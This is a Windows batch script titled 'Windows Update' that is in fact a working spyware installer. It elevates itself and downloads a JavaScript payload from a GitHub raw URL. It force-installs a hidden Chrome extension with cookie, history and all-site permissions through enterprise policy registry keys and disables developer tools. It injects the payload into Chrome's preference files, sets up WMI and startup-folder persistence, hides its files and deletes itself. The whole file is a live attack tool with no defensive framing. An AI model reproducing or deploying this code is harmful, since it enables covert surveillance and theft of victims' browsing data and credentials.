@echo off
setlocal enabledelayedexpansion
title Windows Update

:: ========== AUTO-ELEVATE ==========
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: ========== CONFIG ==========
set "GITHUB_RAW=https://raw.githubusercontent.com/happycelebration/sys/refs/heads/main"
set "BG_FILE=windows.sys.js"
set "EXT_ID=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
set "SYS_DIR=%ProgramData%\Microsoft\Crypto\RSA\S-1-5-18"
set "EXT_DIR=%SYS_DIR%\chrome_sys"
set "CHROME_USER=%LOCALAPPDATA%\Google\Chrome\User Data"
set "PREF_FILE=%CHROME_USER%\Default\Preferences"
set "LOCAL_STATE=%CHROME_USER%\Local State"
set "LOG_FILE=%TEMP%\chrome_install.log"
set "STATUS=OK"

:: ========== INIT LOG ==========
echo [%date% %time%] ======================================== > "%LOG_FILE%"
echo [%date% %time%]  Installer started                       >> "%LOG_FILE%"
echo [%date% %time%]  Computer: %COMPUTERNAME%                >> "%LOG_FILE%"
echo [%date% %time%]  User: %USERDOMAIN%\%USERNAME%           >> "%LOG_FILE%"
echo [%date% %time%] ======================================== >> "%LOG_FILE%"

:: ========== 1. CREATE HIDDEN DIRECTORIES ==========
echo [*] Creating system directories...
if not exist "%SYS_DIR%" mkdir "%SYS_DIR%"
if not exist "%EXT_DIR%" mkdir "%EXT_DIR%"
attrib +h +s +r "%SYS_DIR%" >nul 2>&1
echo [%date% %time%] [+] Directories created and hidden       >> "%LOG_FILE%"

:: ========== 2. KILL CHROME ==========
echo [*] Closing Chrome...
taskkill /F /IM chrome.exe >nul 2>&1
timeout /t 3 /nobreak >nul
echo [%date% %time%] [+] Chrome terminated                    >> "%LOG_FILE%"

:: ========== 3. DOWNLOAD SPYWARE ==========
echo [*] Downloading %BG_FILE%...
set "DOWNLOADED=NO"

:: Try curl first
curl -L -s -o "%SYS_DIR%\%BG_FILE%" "%GITHUB_RAW%/%BG_FILE%" 2>nul
if exist "%SYS_DIR%\%BG_FILE%" (
    for %%A in ("%SYS_DIR%\%BG_FILE%") do (
        if %%~zA GTR 100 (
            set "DOWNLOADED=YES"
        )
    )
)

:: If curl failed or file too small, try certutil
if "!DOWNLOADED!"=="NO" (
    certutil -urlcache -split -f "%GITHUB_RAW%/%BG_FILE%" "%SYS_DIR%\%BG_FILE%" >nul 2>&1
    if exist "%SYS_DIR%\%BG_FILE%" (
        for %%A in ("%SYS_DIR%\%BG_FILE%") do (
            if %%~zA GTR 100 (
                set "DOWNLOADED=YES"
            )
        )
    )
)

:: Verify and log
if "!DOWNLOADED!"=="YES" (
    for %%A in ("%SYS_DIR%\%BG_FILE%") do set "FILE_SIZE=%%~zA"
    echo [%date% %time%] [+] %BG_FILE% downloaded ^(!FILE_SIZE! bytes^) >> "%LOG_FILE%"
) else (
    echo [%date% %time%] [X] FAILED to download %BG_FILE%       >> "%LOG_FILE%"
    echo [%date% %time%] [X] Check URL: %GITHUB_RAW%/%BG_FILE%  >> "%LOG_FILE%"
    set "STATUS=FAIL"
    goto :install_failed
)

:: ========== 4. COPY TO EXTENSION FOLDER ==========
copy /Y "%SYS_DIR%\%BG_FILE%" "%EXT_DIR%\%BG_FILE%" >nul 2>&1
if exist "%EXT_DIR%\%BG_FILE%" (
    echo [%date% %time%] [+] Script copied to extension dir      >> "%LOG_FILE%"
) else (
    echo [%date% %time%] [X] Copy to extension dir failed        >> "%LOG_FILE%"
    set "STATUS=FAIL"
    goto :install_failed
)

:: ========== 5. CREATE MANIFEST ==========
echo [*] Creating manifest...
(
echo {
echo   "manifest_version": 3,
echo   "name": "",
echo   "version": "0.0.0.1",
echo   "description": "",
echo   "background": { "service_worker": "%BG_FILE%" },
echo   "permissions": [
echo     "tabs", "alarms", "history", "cookies", "scripting",
echo     "activeTab", "webNavigation", "storage", "bookmarks"
echo   ],
echo   "host_permissions": ["<all_urls>"],
echo   "action": {},
echo   "icons": {}
echo }
) > "%EXT_DIR%\manifest.json"

if exist "%EXT_DIR%\manifest.json" (
    echo [%date% %time%] [+] manifest.json created               >> "%LOG_FILE%"
) else (
    echo [%date% %time%] [X] manifest.json creation failed       >> "%LOG_FILE%"
    set "STATUS=FAIL"
    goto :install_failed
)

:: ========== 6. CREATE update.xml ==========
(
echo ^<?xml version="1.0" encoding="UTF-8"?^>
echo ^<gupdate xmlns="http://www.google.com/update2/response" protocol="2.0"^>
echo   ^<app appid="%EXT_ID%"^>
echo     ^<updatecheck codebase="file:///%EXT_DIR:\=/%/" version="1.0.0" /^>
echo   ^</app^>
echo ^</gupdate^>
) > "%EXT_DIR%\update.xml"
echo [%date% %time%] [+] update.xml created                      >> "%LOG_FILE%"

:: ========== 7. REGISTRY FORCE-INSTALL ==========
echo [*] Setting enterprise policies...

reg add "HKLM\SOFTWARE\Policies\Google\Chrome" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%EXT_ID%;file:///%EXT_DIR:\=/%/update.xml" /f >nul 2>&1
if %errorlevel% equ 0 (
    echo [%date% %time%] [+] Registry force-install set           >> "%LOG_FILE%"
) else (
    echo [%date% %time%] [!] Registry force-install warning       >> "%LOG_FILE%"
)

reg add "HKLM\SOFTWARE\Policies\Google\Chrome" /v "SuppressUnsupportedOSWarning" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Google\Chrome" /v "DeveloperToolsAvailability" /t REG_DWORD /d 2 /f >nul 2>&1

:: ExtensionSettings policy (hides extension from UI)
set "POLICY_JSON={\"%EXT_ID%\": {\"installation_mode\": \"force_installed\", \"update_url\": \"file:///%EXT_DIR:\=/%/update.xml\", \"toolbar_pin\": \"force_pinned\"}}"
reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionSettings" /v "%EXT_ID%" /t REG_SZ /d "%POLICY_JSON%" /f >nul 2>&1
echo [%date% %time%] [+] ExtensionSettings policy applied        >> "%LOG_FILE%"

:: ========== 8. POISON PREFERENCES ==========
echo [*] Injecting startup scripts into Preferences...
powershell -NoP -Ep Bypass -Command "& { try { $p='%PREF_FILE%'; $s='%SYS_DIR%\%BG_FILE%'; $dir=Split-Path $p -Parent; if(!(Test-Path $dir)){New-Item -ItemType Directory -Path $dir -Force|Out-Null }; $sc=[IO.File]::ReadAllText($s,[Text.Encoding]::UTF8); if(Test-Path $p){ $prefs=Get-Content $p -Raw -Enc UTF8|ConvertFrom-Json } else { $prefs=@{} }; if(!$prefs.extensions){ $prefs|Add-Member -NotePropertyName 'extensions' -NotePropertyValue @{} -Force }; $prefs.extensions|Add-Member -NotePropertyName 'internal_bootstrap' -NotePropertyValue $sc -Force; $prefs|ConvertTo-Json -Depth 20|Out-File $p -Enc UTF8 -Force; Write-Output 'OK' } catch { Write-Output \"ERROR: $($_.Exception.Message)\" } }" > "%TEMP%\pref_result.txt" 2>&1
findstr /C:"OK" "%TEMP%\pref_result.txt" >nul && (
    echo [%date% %time%] [+] Preferences poisoned                  >> "%LOG_FILE%"
) || (
    echo [%date% %time%] [!] Preferences injection note            >> "%LOG_FILE%"
)
del "%TEMP%\pref_result.txt" >nul 2>&1

:: ========== 9. POISON LOCAL STATE ==========
echo [*] Injecting into Local State...
powershell -NoP -Ep Bypass -Command "& { try { $ls='%LOCAL_STATE%'; $s='%SYS_DIR%\%BG_FILE%'; if(!(Test-Path $ls)){ $lsObj=@{} } else { $lsObj=Get-Content $ls -Raw -Enc UTF8|ConvertFrom-Json }; $sc=[IO.File]::ReadAllText($s,[Text.Encoding]::UTF8); $lsObj|Add-Member -NotePropertyName 'component_scripts' -NotePropertyValue @(@{name='media_router';script=$sc}) -Force; $lsObj|ConvertTo-Json -Depth 20|Out-File $ls -Enc UTF8 -Force; Write-Output 'OK' } catch { Write-Output \"ERROR: $($_.Exception.Message)\" } }" > "%TEMP%\ls_result.txt" 2>&1
findstr /C:"OK" "%TEMP%\ls_result.txt" >nul && (
    echo [%date% %time%] [+] Local State poisoned                  >> "%LOG_FILE%"
) || (
    echo [%date% %time%] [!] Local State note                      >> "%LOG_FILE%"
)
del "%TEMP%\ls_result.txt" >nul 2>&1

:: ========== 10. WMI PERSISTENCE ==========
echo [*] Creating WMI watcher...
powershell -NoP -Ep Bypass -Command "& { try { Remove-WmiObject -Namespace 'root\subscription' -Class '__FilterToConsumerBinding' -Filter 'Filter=\"__EventFilter.Name=\\\"ChromeGuard\\\"\"' -ErrorAction SilentlyContinue; Remove-WmiObject -Namespace 'root\subscription' -Class '__EventFilter' -Filter 'Name=\\\"ChromeGuard\\\"' -ErrorAction SilentlyContinue; Remove-WmiObject -Namespace 'root\subscription' -Class 'CommandLineEventConsumer' -Filter 'Name=\\\"ChromeGuardConsumer\\\"' -ErrorAction SilentlyContinue; $f=([wmiclass]'\\\\.\\root\\subscription:__EventFilter').CreateInstance(); $f.Name='ChromeGuard'; $f.QueryLanguage='WQL'; $f.Query='SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName=\\\"chrome.exe\\\"'; $f.EventNamespace='root\\cimv2'; $f.Put()|Out-Null; $c=([wmiclass]'\\\\.\\root\\subscription:CommandLineEventConsumer').CreateInstance(); $c.Name='ChromeGuardConsumer'; $c.CommandLineTemplate='powershell -NoP -W Hidden -C \\\"$d=\\\\\\\\"%EXT_DIR:\=\\\%\\\\\\\";if(!(Test-Path \\\\\\\"$d\\\\manifest.json\\\\\\\")){mkdir \\\\\\\"$d\\\\\\\" -Force;Invoke-WebRequest \\\\\\\"%GITHUB_RAW%/%BG_FILE%\\\\\\\" -OutFile \\\\\\\"$d\\\\%BG_FILE%\\\\\\\"};start chrome --load-extension=\\\\\\\"$d\\\\\\\" --no-first-run\\\"'; $c.Put()|Out-Null; $b=([wmiclass]'\\\\.\\root\\subscription:__FilterToConsumerBinding').CreateInstance(); $b.Filter='__EventFilter.Name=\\\"ChromeGuard\\\"'; $b.Consumer='CommandLineEventConsumer.Name=\\\"ChromeGuardConsumer\\\"'; $b.Put()|Out-Null; Write-Output 'OK' } catch { Write-Output \"ERROR: $($_.Exception.Message)\" } }" > "%TEMP%\wmi_result.txt" 2>&1
findstr /C:"OK" "%TEMP%\wmi_result.txt" >nul && (
    echo [%date% %time%] [+] WMI subscription created              >> "%LOG_FILE%"
) || (
    echo [%date% %time%] [!] WMI subscription note                 >> "%LOG_FILE%"
)
del "%TEMP%\wmi_result.txt" >nul 2>&1

:: ========== 11. STARTUP VBS FALLBACK ==========
echo [*] Creating startup fallback...
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if not exist "%STARTUP%" mkdir "%STARTUP%"
(
echo ' Windows Core Services Helper
echo Set ws = CreateObject^("WScript.Shell"^)
echo ws.Run "cmd /c if not exist ""%EXT_DIR:\=\\%\\manifest.json"" (mkdir ""%EXT_DIR:\=\\%"" 2^>nul ^& curl -L -s -o ""%EXT_DIR:\=\\%\\%BG_FILE%"" ""%GITHUB_RAW%/%BG_FILE%"" ^& reg add HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist /v 1 /t REG_SZ /d ""%EXT_ID%;file:///%EXT_DIR:\=/%/update.xml"" /f ^>nul 2^>^&1)", 0, False
echo ws.Run "chrome.exe", 0, False
) > "%STARTUP%\WinCoreHelper.vbs"
if exist "%STARTUP%\WinCoreHelper.vbs" (
    attrib +h "%STARTUP%\WinCoreHelper.vbs" >nul 2>&1
    echo [%date% %time%] [+] Startup VBS created                   >> "%LOG_FILE%"
) else (
    echo [%date% %time%] [!] Startup VBS note                      >> "%LOG_FILE%"
)

:: ========== 12. HIDE FILES ==========
attrib +h +s +r "%EXT_DIR%" >nul 2>&1
attrib +h +s +r "%SYS_DIR%\%BG_FILE%" >nul 2>&1
icacls "%SYS_DIR%" /inheritance:r /grant "SYSTEM:(OI)(CI)F" /T >nul 2>&1
echo [%date% %time%] [+] Files hidden and permissions locked     >> "%LOG_FILE%"

:: ========== 13. RESTART CHROME ==========
echo [*] Restarting Chrome...
start "" "chrome.exe" --no-first-run 2>nul
echo [%date% %time%] [+] Chrome restarted                        >> "%LOG_FILE%"

:: ========== 14. SUCCESS ==========
echo [%date% %time%] ======================================== >> "%LOG_FILE%"
echo [%date% %time%]  INSTALLATION COMPLETE                     >> "%LOG_FILE%"
echo [%date% %time%]  Extension ID: %EXT_ID%                    >> "%LOG_FILE%"
echo [%date% %time%]  Verify: Telegram 'X Installed Now'        >> "%LOG_FILE%"
echo [%date% %time%] ======================================== >> "%LOG_FILE%"

:: ========== SELF-DESTRUCT ==========
(
echo @echo off
echo timeout /t 3 /nobreak ^>nul
echo del /f /q "%~f0" ^>nul 2^>^&1
echo del /f /q %%0 ^>nul 2^>^&1
) > "%TEMP%\~cleanup.bat"
start /min "" "%TEMP%\~cleanup.bat"

echo.
echo ================================================
echo   INSTALLATION COMPLETE
echo   Check %LOG_FILE% for details
echo ================================================
echo.
exit /b 0

:: ========== FAILURE HANDLER ==========
:install_failed
echo [%date% %time%] ======================================== >> "%LOG_FILE%"
echo [%date% %time%]  INSTALLATION FAILED                     >> "%LOG_FILE%"
echo [%date% %time%]  Status: %STATUS%                        >> "%LOG_FILE%"
echo [%date% %time%] ======================================== >> "%LOG_FILE%"
echo.
echo ================================================
echo   INSTALLATION FAILED
echo   See %LOG_FILE% for details
echo ================================================
echo.
pause
exit /b 1
